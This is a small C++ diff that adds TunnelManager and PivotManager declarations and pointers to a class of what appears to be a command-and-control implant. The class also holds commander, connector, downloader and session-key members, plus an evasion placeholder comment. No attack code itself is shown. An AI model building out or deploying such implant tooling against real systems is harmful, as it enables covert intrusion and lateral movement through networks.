@@ -19,6 +19,8 @@ class Commander;
 class Connector;
 class JobsController;
 class Downloader;
+class TunnelManager;
+class PivotManager;
 // __EVASION_FORWARD_DECL__
 
 struct TokenEntry {
@@ -35,6 +37,8 @@ public:
     Connector*      connector  = nullptr;
     JobsController* jobs       = nullptr;
     Downloader*     downloader = nullptr;
+    TunnelManager*  tunnelMgr  = nullptr;
+    PivotManager*   pivotMgr   = nullptr;
 
     BYTE*   sessionKey = nullptr;
     BOOL    active     = TRUE;
